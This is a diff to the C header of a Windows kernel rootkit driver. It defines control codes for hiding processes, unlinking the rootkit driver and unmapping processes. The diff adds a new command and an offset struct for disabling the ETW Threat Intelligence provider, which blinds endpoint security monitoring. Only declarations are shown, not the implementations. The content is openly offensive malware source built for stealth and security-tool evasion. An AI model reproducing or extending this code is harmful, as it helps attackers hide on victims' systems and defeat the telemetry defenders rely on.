@@ -38,6 +38,7 @@
 #define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
 #define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
 #define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
+#define IOCTL_WIN_ETW_DISABLE CTL_CODE_HIDE(17)
 
 
 
@@ -174,7 +175,11 @@ struct hideProcArgs {
     DWORD offset;
 };
 
-
+struct disKerETWArgs {
+    DWORD etWThreatIntProvRegHandleOffset;
+    DWORD regEntry_guidEntryOffset;
+    DWORD GuidEntry_ProviderEnableInfoOffset;
+};
 
 
 ModulesData* EnumRegisteredDrivers(UINT64);
@@ -199,6 +204,8 @@ NTSTATUS unmapProcess(ULONG_PTR);
 
 NTSTATUS procHiding(DWORD, DWORD);
 NTSTATUS unlinkDriver(PDRIVER_OBJECT);
+
+NTSTATUS disablingWTI(ULONG64, disKerETWArgs);
 
 #ifndef SystemModuleInformation
 #define SystemModuleInformation 0xB
